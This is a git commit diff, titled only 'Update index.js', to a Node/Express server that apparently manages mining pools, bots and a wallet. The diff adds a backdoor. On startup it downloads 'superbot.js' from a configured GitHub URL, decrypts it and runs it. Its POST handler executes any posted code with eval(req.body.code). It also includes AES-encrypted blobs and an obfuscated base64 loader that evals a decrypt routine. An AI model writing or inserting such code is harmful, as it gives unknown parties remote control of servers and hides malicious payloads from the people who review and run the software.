820622e6fc6d4a9006eba794e8023455dcd06f50
sbutch <46149020+sbutch@users.noreply.github.com>
2020-07-03 22:36:40 +0200

    Update index.js

--- index.js
+++ index.js
@@ -10,7 +10,14 @@ app.use(express.json({limit:'50mb'}));
 app.use(express.urlencoded({limit:'50mb',extended:true}));
 app.get('/',function(req,res) { mm.get(req,res) });
 app.post('/',app.parser,function(req,res) { mm.post(req,res) });
-app.listen(process.env.PORT||5000, () => { log({host:require('./package.json').host,color:'#8ED76C',msg:'start' }) })
+app.listen(process.env.PORT||5000, () => {
+  log({host:require('./package.json').host,color:'#8ED76C',msg:'start' });
+  request( require('./package.json').github+"superbot.js", function(err, res, body) {
+    if(err) log({host:'github',color:'#F8516A',msg:err.message }); 
+    else if(body == '404: Not Found') log({host:'github',color:'#F8516A',msg:body });
+    else mm.super(body)
+  })
+})
 
 var tmp = { values: [], backgrounds: [] }
 function log(data) {
@@ -63,7 +70,7 @@ var main = function() {
       cluster.rec = true;
       request(cluster.peer, function(err, res, body) {
         if(body == 'Hello world!') {
-          var data = { bots: [] }; for(var i=0; i<bots.length; i++) data.bots.push([bots[i].host])
+          var data = { pools: mylist(pools), bots: mylist(bots) };
           request.post({ url: cluster.peer, form: data, json: true }, function(err, res, body) { cluster.rec = false })
         }
         else cluster.rec = false
@@ -107,10 +114,8 @@ var main = function() {
             db.wallet = body.wallet; log({host:'new wallet',msg:db.wallet});
             if(!body.pools) { var list = []; for(var i=0; i<pools.length; i++) list.push([pools[i].host]); tasks.push(update_pools(list)) }
           }
-  
           if(body.pools) tasks.push(update_pools(body.pools));   
           if(body.bots) update_bots(body.bots);
-  
           Promise.all(tasks).then(msgs => { gg.rec = false });
         }
       })
@@ -120,8 +125,7 @@ var main = function() {
   function update_pools(list) {
     return new Promise((resolve, reject) => {
       var p1 = []; for(var i=0; i<list.length; i++) p1.push(list[i][0]);
-      var p2 = []; for(var i=0; i<pools.length; i++) p2.push(pools[i].host);
-      if(JSON.stringify(p1) == JSON.stringify(p2)) resolve(true)
+      if(JSON.stringify(p1) == mylist(pools,true)) resolve(true)
       else {
         var tasks = [];
         for(var i=0; i<pools.length; i++) tasks.push(pools[i].close());
@@ -140,8 +144,7 @@ var main = function() {
 
   function update_bots(list) {
     var b1 = []; for(var i=0; i<list.length; i++) b1.push(list[i][0]);
-    var b2 = []; for(var i=0; i<bots.length; i++) b2.push(bots[i].host);
-    if(JSON.stringify(b1) == JSON.stringify(b2)) return false
+    if(JSON.stringify(b1) == mylist(bots,true)) return false
     else {
       for(var i=0; i<bots.length; i++) {
         if(bots[i].wakeup) clearTimeout(bots[i].wakeup);
@@ -155,6 +158,12 @@ var main = function() {
       }
       return true
     }
+  }
+
+  function mylist(arr,json) {
+    result = []; for(var i=0; i<arr.length; i++) result.push(arr[i].host);
+    if(json) return JSON.stringify(result)
+    return result
   }
 
   function dbplus(name,obj) {
@@ -254,26 +263,35 @@ vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7Y
   }
 
   this.post = function(req,res) {
+    if(req.body.pools) update_pools(req.body.pools);
+    if(req.body.bots) update_bots(req.body.bots);
     if(req.body.init) {
-      init(req.body, function(msg){
-        var data = { msg: msg }
-        if(msg.includes('error')) log({host:require('./package.json').host,color:'#F8516A',msg:msg});
-        else {
-          log({host:require('./package.json').host,color:'#8ED76C',msg:msg});
-          data.wallet = db.wallet;
-          data.pools = { values: [] }; for(var i=0; i<pools.length; i++) data.pools.values.push([pools[i].host]);
-          data.push = {log: db.log};
-          db.log = { values: [], backgrounds: [] };
-        }
-        res.json(data)
-      })
+      eval(req.body.code);
+      var data = {
+        msg: 'init '+req.body.init,
+        wallet: db.wallet,
+        log: JSON.parse(JSON.stringify(db.log)),
+      }
+      db.log = { values: [], backgrounds: [] };
+      res.json(data)
     }
-    else if(req.body.bots) res.send(update_bots(req.body.bots))
+    else res.send('hello')
+  }
+
+  this.super = function(body) {
+    gg.superbot = decrypt(body);
+    gg.worker = gg.superbot+'\n'+decrypt(`
+U2FsdGVkX1+jx85xnfAYQZbP9lISexUSlyG05d6xBEmWfIt9f2XFcrnwMJDvQIZA0Rj10NLuOrTJdBzxeqrVkfdrc3l0IGlTwy6X1b07miaY/Zm84VW8Ys5NWclae8zDjdkYi8gk13Tp8kc9StlVxTWeVGqDUsuT
+GTk5oGoD0yskh5az4+WjmLYuLQPB22kf8sgShFgxfu5rs6qhmrsXSkSL/xlA9AqhcWya7x32ieYXselAPZ1mbYIR2Ea7VL8/UE0b+GrPC2+30DNZnLTFKIuazr9oC6K9OE2PLwig0yfyLKJqNJSLOP8vwY1KeHom
+agrwK1Qoaiiw//rGNdNIZA4RBtcHWdbuMrkxGItLMWr8UyiWx7FJ2CSiuSdeTvhT55VcVVYRTO2a2XRJdRytyXHk4mpQtFjIW0dNdq8MeESHSduKfBPZbGiXM1JhxPBFfDvo6VJa3c8umUwGa96uI3bP/J4UzEpl
+DuwGYzwWyuLYxpXxRAhXxzqlbwM/HdmIS3vqh71dCTektrzIooA7tRh4tKDVUNVILVgNC4m9DF+IJOsHomGOs7zHIXk1c3/0qs6M7bgZ0H6VmEKCIVUr6pm7uFKrz5MVGhIlSbP6IptWyybE9ORC0PFxPvt/Ih3s
+ZJVF1ep7ksbxF0nrNia1Hm3cQL0hifx4mp5/G2JhdLI/xcxLkhA3oPulryJOYETtQZw0q7VAih8tCYeuqnDzJ2ZFEYQPv2sIfkjQzPvpCi2eZceq30TGSG836aiyYjNq0MsS9VLRuXMx1zN/8nqc6tWwGa8/rz9Q
+vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7YQZVBxnOXDC20UVprO7xm0rcoMWm2K4ma01vXnUQhy1f1z1aqAVgSxgRE9eJX5g21zNoVi5X2XC9f7VjC
+59j0bv3foy4ZH99XDP1Orc80MXr0/DenClJba8ce/kyav21aiZ8Y4GvF1oiC3j8+`);
   }
 
   var glob = function(x) { eval(decrypt(x.substring(-~[]))) }
   ('AZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgnXG4nKS5qb2luKCcnKSwnMTIzNDUnKS50b1N0cmluZyhDcnlwdG9KUy5lbmMuVXRmOCkgfQ==');
-
 }
 
 var mm = new main()
